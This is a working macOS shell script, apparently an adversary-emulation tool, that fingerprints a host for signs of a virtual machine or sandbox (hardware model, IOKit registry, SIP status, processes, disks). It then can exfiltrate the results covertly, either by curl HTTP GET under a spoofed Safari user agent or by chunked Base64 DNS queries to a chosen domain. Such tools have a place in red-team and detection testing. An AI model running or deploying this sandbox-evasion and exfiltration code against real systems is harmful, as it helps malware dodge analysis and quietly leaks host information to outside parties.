#!/bin/sh
# VMSandboxDiscovery - Virtualization Environment Detection Script
# Author: @darmad0
# Date: 2023-10-06
# Version: 1.1
# techhnique: T1497.001 
#
# Description:
# This script checks for indicators suggesting macOS is in 
# a virtualized environment or sandbox, examining hardware, 
# CPU, disk, and running processes. It uses anti-evasion techniques,
# such as #exfiltrating results via DNS or HTTP with Base64 encoding.
#
#
# References:
# - https://evasions.checkpoint.com/src/MacOS/macos.html
# - https://macos.checkpoint.com/families/MacRansom/
# - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1497.001/T1497.001.md
# - https://github.com/cyberark/VMSandboxDetection
# - https://attack.mitre.org/techniques/T1497/001/

# Usage:
#   ./VMSandboxDiscovery.sh [OPTIONS]
#
# Options:
#   --all                              Run all checks
#   --boot-rom-version                 Check for Boot ROM versions associated with virtual machines (e.g., VMware, VirtualBox)
#   --cpu-cores                        Check the number of CPU cores to identify typical VM configurations
#   --disks                            Check for disk drive names associated with virtual machines (e.g., VMware, VirtualBox)
#   --encode=[b64|hex|uuencode|perl_b64|perl_utf8]  Encode output in the specified format
#   --exfil=[URI|dns=DOMAIN]           Exfiltrate the output to the specified URI using HTTP GET or via DNS queries to the specified domain (Base64 encoded)
#   --files                            Check for device files associated with virtual machines (e.g., /dev/vbox, /dev/vmware)
#   --hardware-model                   Check for hardware models associated with virtual machines (e.g., VMware, VirtualBox)
#   --help                             Display this help message
#   --hyperthreading                   Check if hyperthreading is enabled, which is common in VMs
#   --iokit-registry                   Check for IOKit registry entries associated with virtual machines
#   --log                              Write output to a hashed log file in the current directory
#                                     (No output will be printed to the screen)
#   --memory-size                      Check the total memory size to identify typical VM configurations
#   --network                          Check for network adapters associated with virtual machines
#   --processes                        Check for running processes associated with virtual machines (e.g., VMware, VirtualBox)
#   --sip                              Check the status of System Integrity Protection (SIP)
#   --usb-vendor-name                  Check for USB vendor names associated with virtual machines
#   --verbose                          Enable verbose output
#
# Example:
#   ./VMSandboxDiscovery.sh --verbose --encode=b64 --log --exfil=dns=example.com

# Initialize an array to store virtualization indicators and their evidence
virtualization_indicators=()
output=""
verbose_messages=()
INVALID_ARG=false
LOG=false
LOG_FILE=""
EXFIL=false
EXFIL_METHOD=""
EXFIL_URI=""

# Parse command-line arguments
VERBOSE=false
ENCODE="none"
HELP=false
ALL=false
for arg in "$@"; do
    case $arg in
        --all)
            ALL=true
            ;;
        --boot-rom-version)
            CHECK_BOOT_ROM_VERSION=true
            ;;
        --cpu-cores)
            CHECK_CPU_CORE_COUNT=true
            ;;
        --disks)
            CHECK_DISKS=true
            ;;
        --encode=*)
            ENCODE="${arg#*=}"
            ;;
        --exfil=*)
            EXFIL=true
            EXFIL_METHOD="${arg#*=}"
            if [[ "$EXFIL_METHOD" == dns=* ]]; then
                EXFIL_METHOD="dns"
                EXFIL_URI="${arg#*=dns=}"
            else
                EXFIL_METHOD="http"
                EXFIL_URI="${arg#*=}"
            fi
            ;;
        --files)
            CHECK_FILES=true
            ;;
        --hardware-model)
            CHECK_HARDWARE_MODEL=true
            ;;
        --help)
            HELP=true
            ;;
        --hyperthreading)
            CHECK_HYPERTHREADING=true
            ;;
        --iokit-registry)
            CHECK_IOKIT_REGISTRY=true
            ;;
        --log)
            LOG=true
            ;;
        --memory-size)
            CHECK_MEMORY_SIZE=true
            ;;
        --network)
            CHECK_NETWORK=true
            ;;
        --processes)
            CHECK_PROCESSES=true
            ;;
        --sip)
            CHECK_SYSTEM_INTEGRITY_PROTECTION=true
            ;;
        --usb-vendor-name)
            CHECK_USB_VENDOR_NAME=true
            ;;
        --verbose)
            VERBOSE=true
            ;;
        *)
            INVALID_ARG=true
            ;;
    esac
done

# Display help message if needed
if [ "$HELP" = true ] || [ "$INVALID_ARG" = true ] || [ "$#" -eq 0 ]; then
    echo "Usage: $0 [OPTIONS]"
    echo
    echo "Options:"
    echo "  --all                              Run all checks"
    echo "  --boot-rom-version                 Check for Boot ROM versions associated with virtual machines (e.g., VMware, VirtualBox)"
    echo "  --cpu-cores                        Check the number of CPU cores to identify typical VM configurations"
    echo "  --disks                            Check for disk drive names associated with virtual machines (e.g., VMware, VirtualBox)"
    echo "  --encode=[b64|hex|uuencode|perl_b64|perl_utf8]  Encode output in the specified format"
    echo "  --exfil=[URI|dns=DOMAIN]           Exfiltrate the output to the specified URI using HTTP GET or via DNS queries to the specified domain (Base64 encoded)"
    echo "  --files                            Check for device files associated with virtual machines (e.g., /dev/vbox, /dev/vmware)"
    echo "  --hardware-model                   Check for hardware models associated with virtual machines (e.g., VMware, VirtualBox)"
    echo "  --help                             Display this help message"
    echo "  --hyperthreading                   Check if hyperthreading is enabled, which is common in VMs"
    echo "  --iokit-registry                   Check for IOKit registry entries associated with virtual machines"
    echo "  --log                              Write output to a hashed log file in the current directory"
    echo "                                     (No output will be printed to the screen)"
    echo "  --memory-size                      Check the total memory size to identify typical VM configurations"
    echo "  --network                          Check for network adapters associated with virtual machines"
    echo "  --processes                        Check for running processes associated with virtual machines (e.g., VMware, VirtualBox)"
    echo "  --sip                              Check the status of System Integrity Protection (SIP)"
    echo "  --usb-vendor-name                  Check for USB vendor names associated with virtual machines"
    echo "  --verbose                          Enable verbose output"
    echo
    echo "If no options are provided, the script will display this help message."
    exit 0
fi

# Generate a hashed log file name if logging is enabled
if [ "$LOG" = true ]; then
    if [ "$ENCODE" = "none" ]; then
        LOG_FILE="discovery.$(date +%s | sha256sum | base64 | head -c 32).log"
    else
        LOG_FILE="discovery.${ENCODE}.$(date +%s | sha256sum | base64 | head -c 32).log"
    fi
fi

# Store verbose messages
store_verbose_message() {
    local message=$1
    verbose_messages+=("$message")
}

# Print verbose messages
print_verbose_messages() {
    for message in "${verbose_messages[@]}"; do
        echo "[+] message: $message"
    done
}

# Encode output based on the specified encoding method
encode_output() {
    local output=$1
    case $ENCODE in
        b64)
            echo "$output" | base64
            ;;
        hex)
            echo "$output" | xxd -p
            ;;
        uuencode)
            echo "$output" | uuencode -m -
            ;;
        perl_b64)
            echo "$output" | perl -e 'use MIME::Base64; print encode_base64(join("", <STDIN>));'
            ;;
        perl_utf8)
            echo "$output" | perl -e 'use Encode qw(encode); print encode("utf8", join("", <STDIN>));'
            ;;
        *)
            echo "$output"
            ;;
    esac
}

# Print output, encoding if necessary
print_output() {
    local output=$1
    if [ "$ENCODE" != "none" ]; then
        encode_output "$output"
    else
        echo "$output"
    fi
}

# Exfiltrate data via HTTP GET
exfiltrate_http() {
    local data=$1
    local uri=$2
    encoded_data=$(echo "$data" | base64)
    curl -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15" "$uri?data=$encoded_data"
}

# Helper function - not ideal 
#  Edge case function for DNS exfiltration 
# used by exfiltrate_dns() and exfiltrate_http()
# in cases where the  enncode_output() function is invoked by --encode option
base64_encode() {
    echo "$1" | base64
}

# Chunk the base64 encoded payload
chunk_payload() {
    local payload=$1
    local chunk_size=$2
    local chunks=()
    while [ -n "$payload" ]; do
        chunks+=("${payload:0:$chunk_size}")
        payload=${payload:$chunk_size}
    done
    echo "${chunks[@]}"
}

# Send DNS queries with chunked data
send_dns_queries() {
    local chunks=("$@")
    local domain="$EXFIL_URI"
    for chunk in "${chunks[@]}"; do
        dig +short "$chunk.$domain" A > /dev/null
    done
}

# Exfiltrate data via DNS
exfiltrate_dns() {
    local data=$1
    local encoded_data=$(base64_encode "$data")
    local chunk_size=63  # Max length of a DNS label
    local chunks=($(chunk_payload "$encoded_data" $chunk_size))
    send_dns_queries "${chunks[@]}"
}

# Detection functions (implementations)
discover_hardware_model() {
    model=$(sysctl -n hw.model)
    if echo "$model" | grep -qiE "virtualbox|vmware|parallels|qemu|xen"; then
        output="$output\nHardware Model: $model"
        virtualization_indicators+=("Hardware Model: $model")
    else
        output="$output\nHardware Model: $model (No virtualization-specific model found)"
    fi
}

discover_hyperthreading() {
    ht=$(sysctl -n machdep.cpu.thread_count)
    output="$output\nHyper-Threading: $ht"
    virtualization_indicators+=("Hyper-Threading: $ht")
}

discover_memory_size() {
    mem=$(sysctl -n hw.memsize)
    output="$output\nMemory Size: $mem"
    virtualization_indicators+=("Memory Size: $mem")
}

discover_iokit_registry() {
    iokit=$(ioreg -rd1 -c IOPlatformExpertDevice)
    if echo "$iokit" | grep -qiE "virtualbox|vmware|parallels|qemu|xen"; then
        output="$output\nIOKit Registry: $iokit"
        virtualization_indicators+=("IOKit Registry: $iokit")
    else
        output="$output\nIOKit Registry: No virtualization-specific entries found"
    fi
}

discover_usb_vendor_name() {
    usb=$(ioreg -rd1 -c IOUSBHostDevice | grep "USB Vendor Name")
    if echo "$usb" | grep -qiE "virtualbox|vmware|parallels|qemu|xen"; then
        output="$output\nUSB Vendor Name: $usb"
        virtualization_indicators+=("USB Vendor Name: $usb")
    else
        output="$output\nUSB Vendor Name: No virtualization-specific vendors found"
    fi
}

discover_boot_rom_version() {
    bootrom=$(system_profiler SPHardwareDataType | grep "Boot ROM Version")
    if echo "$bootrom" | grep -qiE "virtualbox|vmware|parallels|qemu|xen"; then
        output="$output\nBoot ROM Version: $bootrom"
        virtualization_indicators+=("Boot ROM Version: $bootrom")
    else
        output="$output\nBoot ROM Version: $bootrom (No virtualization-specific version found)"
    fi
}

discover_system_integrity_protection() {
    sip=$(csrutil status)
    output="$output\nSystem Integrity Protection: $sip"
    virtualization_indicators+=("System Integrity Protection: $sip")
}

discover_cpu_core_count() {
    cores=$(sysctl -n hw.physicalcpu)
    output="$output\nCPU Core Count: $cores"
    virtualization_indicators+=("CPU Core Count: $cores")
}

discover_virtualization_processes() {
    processes=$(ps aux | grep -iE "vmware|virtualbox|parallels|qemu|xen" | grep -v "grep")
    if [ -n "$processes" ]; then
        output="$output\nVirtualization Processes: $processes"
        virtualization_indicators+=("Virtualization Processes: $processes")
    else
        output="$output\nVirtualization Processes: None"
    fi
}

discover_virtualization_files() {
    files=$(ls /dev | grep -iE "vbox|vmware|parallels|qemu|xen")
    if [ -n "$files" ]; then
        output="$output\nVirtualization Files: $files"
        virtualization_indicators+=("Virtualization Files: $files")
    else
        output="$output\nVirtualization Files: None"
    fi
}

discover_network_adapters() {
    adapters=$(networksetup -listallhardwareports)
    output="$output\nNetwork Adapters: $adapters"
    virtualization_indicators+=("Network Adapters: $adapters")
}

discover_disk_drive_names() {
    disks=$(diskutil list)
    if echo "$disks" | grep -qiE "vbox|vmware|parallels|qemu|xen"; then
        output="$output\nDisk Drive Names: $disks"
        virtualization_indicators+=("Disk Drive Names: $disks")
    else
        output="$output\nDisk Drive Names: No virtualization-specific disks found"
    fi
}

# Main function to call all detection functions and handle encoding
main() {
    if [ "$ALL" = true ] || [ "$CHECK_BOOT_ROM_VERSION" = true ]; then
        discover_boot_rom_version
    fi
    if [ "$ALL" = true ] || [ "$CHECK_CPU_CORE_COUNT" = true ]; then
        discover_cpu_core_count
    fi
    if [ "$ALL" = true ] || [ "$CHECK_DISKS" = true ]; then
        discover_disk_drive_names
    fi
    if [ "$ALL" = true ] || [ "$CHECK_FILES" = true ]; then
        discover_virtualization_files
    fi
    if [ "$ALL" = true ] || [ "$CHECK_HARDWARE_MODEL" = true ]; then
        discover_hardware_model
    fi
    if [ "$ALL" = true ] || [ "$CHECK_HYPERTHREADING" = true ]; then
        discover_hyperthreading
    fi
    if [ "$ALL" = true ] || [ "$CHECK_IOKIT_REGISTRY" = true ]; then
        discover_iokit_registry
    fi
    if [ "$ALL" = true ] || [ "$CHECK_MEMORY_SIZE" = true ]; then
        discover_memory_size
    fi
    if [ "$ALL" = true ] || [ "$CHECK_NETWORK" = true ]; then
        discover_network_adapters
    fi
    if [ "$ALL" = true ] || [ "$CHECK_PROCESSES" = true ]; then
        discover_virtualization_processes
    fi
    if [ "$ALL" = true ] || [ "$CHECK_SYSTEM_INTEGRITY_PROTECTION" = true ]; then
        discover_system_integrity_protection
    fi
    if [ "$ALL" = true ] || [ "$CHECK_USB_VENDOR_NAME" = true ]; then
        discover_usb_vendor_name
    fi

    if [ "$LOG" = true ]; then
        if [ "$ENCODE" != "none" ]; then
            encoded_output=$(encode_output "$output")
            echo -e "$encoded_output" > "$LOG_FILE"
        else
            echo -e "$output" > "$LOG_FILE"
        fi
    elif [ "$EXFIL" = true ]; then
        if [ "$EXFIL_METHOD" = "dns" ]; then
            if [ "$ENCODE" != "none" ]; then
                encoded_output=$(encode_output "$output")
                exfiltrate_dns "$encoded_output"
            else
                exfiltrate_dns "$output"
            fi
        else
            if [ "$ENCODE" != "none" ]; then
                encoded_output=$(encode_output "$output")
                exfiltrate_http "$encoded_output" "$EXFIL_URI"
            else
                exfiltrate_http "$output" "$EXFIL_URI"
            fi
        fi
    else
        if [ "$ENCODE" = "none" ]; then
            echo -e "$output"
            echo
            echo "[+] virtualization indicators"
            if [ ${#virtualization_indicators[@]} -gt 0 ]; then
                if [ "$VERBOSE" = true ]; then
                    echo "[+] message: the system is running in a virtual environment based on the following indicators:"
                fi
                for indicator in "${virtualization_indicators[@]}"; do
                    echo "  - $indicator"
                done
            else
                if [ "$VERBOSE" = true ]; then
                    echo "[+] message: no virtualization indicators detected. the system does not appear to be running in a virtual environment."
                fi
            fi
        else
            print_output "$output"
        fi
    fi

    # Print verbose messages if --verbose is set
    if [ "$VERBOSE" = true ]; then
        print_verbose_messages
    fi
}

# Run the main function
main
